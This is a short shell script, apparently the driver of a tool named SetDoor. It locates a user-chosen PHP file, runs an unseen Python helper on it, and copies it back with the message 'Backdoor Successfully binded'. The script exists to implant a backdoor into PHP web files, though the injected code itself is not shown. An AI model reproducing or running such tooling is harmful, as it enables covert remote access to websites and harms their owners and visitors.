pip install -r Assets/module.txt
python Assets/header.py
echo -e "\e[1;34m Enter the folder name where your php file is located ::"
read folder
foldername=`find //sdcard/ -name $folder`
if [ -d "$foldername" ]
then
echo -e "\e[1;34m Enter your PHP file's name ::"
read name
file=`find $foldername -name $name`
if [ -f "$file" ]
then
cp $file $HOME/SetDoor
echo "success"
run="yes"
else
run="no"
echo -e "\e[1;31m  ERR :: File not found !"
fi
else
run="no"
echo "ERR :: Folder not found !"
fi
if [ $run = "yes" ]
then
export name
python Assets/body.py
cp $name $foldername
echo -e "\e[0;32m Backdoor Successfully binded to /$foldername/$name"
else
echo -e "\e[0;31m ERR:: Binding error or file/folder does not exist , check the names that you entered and try again "
fi
